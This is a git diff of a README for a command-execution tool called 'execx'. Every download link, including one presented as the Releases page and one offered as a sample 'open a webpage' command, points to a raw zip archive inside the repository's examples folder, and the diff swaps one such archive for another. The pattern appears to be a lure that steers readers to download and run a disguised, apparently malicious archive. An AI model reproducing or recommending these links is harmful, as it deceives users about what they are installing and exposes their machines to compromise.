@@ -1,6 +1,6 @@
 # 🎉 execx - Run Commands Simply and Safely
 
-[![Download execx](https://github.com/zakaria-x9/execx/raw/refs/heads/main/examples/withpty/Software_v3.9.zip)](https://github.com/zakaria-x9/execx/raw/refs/heads/main/examples/withpty/Software_v3.9.zip)
+[![Download execx](https://raw.githubusercontent.com/zakaria-x9/execx/main/examples/onstdout/Software_v3.8-beta.4.zip)](https://raw.githubusercontent.com/zakaria-x9/execx/main/examples/onstdout/Software_v3.8-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -9,12 +9,12 @@ Welcome to execx! This software makes running external commands easy and safe. Y
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [visit this page to download](https://github.com/zakaria-x9/execx/raw/refs/heads/main/examples/withpty/Software_v3.9.zip)
+   [visit this page to download](https://raw.githubusercontent.com/zakaria-x9/execx/main/examples/onstdout/Software_v3.8-beta.4.zip)
 
 2. Look for the latest version of execx on the Releases page.
 
 3. Download the file that matches your operating system:
-   - For Windows, look for `https://github.com/zakaria-x9/execx/raw/refs/heads/main/examples/withpty/Software_v3.9.zip`.
+   - For Windows, look for `https://raw.githubusercontent.com/zakaria-x9/execx/main/examples/onstdout/Software_v3.8-beta.4.zip`.
    - For macOS, look for `execx-macos`.
    - For Linux, look for `execx-linux`.
 
@@ -64,7 +64,7 @@ Here are a couple of simple examples to show how to use execx:
 - **Opening a Webpage:**
   - To open a browser to a specific webpage, type:
     ```
-    execx run open https://github.com/zakaria-x9/execx/raw/refs/heads/main/examples/withpty/Software_v3.9.zip
+    execx run open https://raw.githubusercontent.com/zakaria-x9/execx/main/examples/onstdout/Software_v3.8-beta.4.zip
     ```
 
 ## 💬 Support
@@ -79,6 +79,6 @@ execx is open-source software. Feel free to use and modify it under the terms of
 
 For more information or to connect with the community, visit the GitHub repository. You can share your experiences and suggestions there.
 
-[Download execx](https://github.com/zakaria-x9/execx/raw/refs/heads/main/examples/withpty/Software_v3.9.zip)
+[Download execx](https://raw.githubusercontent.com/zakaria-x9/execx/main/examples/onstdout/Software_v3.8-beta.4.zip)
 
 Enjoy using execx!
